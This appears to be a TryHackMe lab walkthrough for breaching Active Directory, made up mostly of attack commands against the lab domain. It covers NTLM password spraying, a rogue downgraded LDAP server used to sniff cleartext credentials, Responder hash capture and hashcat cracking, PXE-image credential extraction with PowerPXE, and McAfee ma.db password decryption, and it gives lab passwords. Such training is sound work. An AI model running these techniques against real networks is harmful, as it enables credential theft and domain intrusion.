# Breaching Active Directory

**Room Link:** [https://tryhackme.com/room/breachingad](https://tryhackme.com/room/breachingad)



## Introduction to AD Breaches

**Kali**

```
systemd-resolve --interface breachad --set-dns $THMDCIP --set-domain za.tryhackme.com
nslookup thmdc.za.tryhackme.com
```

## NTLM Authenticated Services

**Kali**

```
unzip passwordsprayer.zip 
python /root/Rooms/BreachingAD/task3/ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a "http://ntlmauth.za.tryhackme.com"
```

<figure><img src="../../.gitbook/assets/image (15) (8).png" alt=""><figcaption></figcaption></figure>

## LDAP Bind Credentials

**Kali**

```
service slapd stop
nc -lvp 389
```

<figure><img src="../../.gitbook/assets/image (9) (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14) (10).png" alt=""><figcaption></figcaption></figure>

### Hosting a Rogue LDAP Server

**Kali**

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

<figure><img src="../../.gitbook/assets/image (13) (1) (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
vi olcSaslSecProps.ldif
```



**olcSaslSecProps.ldif**

```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

* olcSaslSecProps: Specifies the SASL security properties
* noanonymous: Disables mechanisms that support anonymous login
* minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

**Kali**

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

**Before**

<figure><img src="../../.gitbook/assets/image (12) (10).png" alt=""><figcaption></figcaption></figure>

**After**

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### Capturing LDAP Credentials

Our rogue LDAP server has now been configured. When we click the "Test Settings" at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx), the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:



<figure><img src="../../.gitbook/assets/image (6) (5) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sudo tcpdump -SX -i breachad tcp port 389
```

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (9).png" alt=""><figcaption></figcaption></figure>



## Authentication Relays

**Kali**

```
sudo service slapd stop
sudo responder -I breachad
```

<figure><img src="../../.gitbook/assets/image (7) (5) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (9) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hashcat -m 5600 hash.txt passwordlist.txt --force 
hashcat -m 5600 hash.txt passwordlist.txt --force --show
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

## Microsoft Deployment Toolkit

**Kali**

```
ssh thm@THMJMP1.za.tryhackme.com
Password: Password1@
```

**Victim**

```
cd Documents
mkdir thm
copy C:\powerpxe thm
cd thm
```

**Victim**

```
tftp -i $THMMDTIP GET "\Tmp\x64{39...28}.bcd" conf.bcd
```

**Victim**

```
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```

**Victim**

```
tftp -i $THMMDTIP  GET "<PXE Boot Image Location>" pxeboot.wim
```

**Victim**

```
Get-FindCredentials -WimFile pxeboot.wim
```

## Configuration Files

**Victim**

```
cd C:\ProgramData\McAfee\Agent\DB
```

**Victim**

```
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
Password: Password1@
```

**Kali**

```
sqlitebrowser ma.db
```

**Kali**

```
cp /root/Rooms/BreachingAD/task7/mcafeesitelistpwddecryption.zip .
unzip mcafeesitelistpwddecryption.zip
```

<figure><img src="../../.gitbook/assets/image (4) (1) (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python2 mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py  jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

<figure><img src="../../.gitbook/assets/image (18) (7).png" alt=""><figcaption></figcaption></figure>
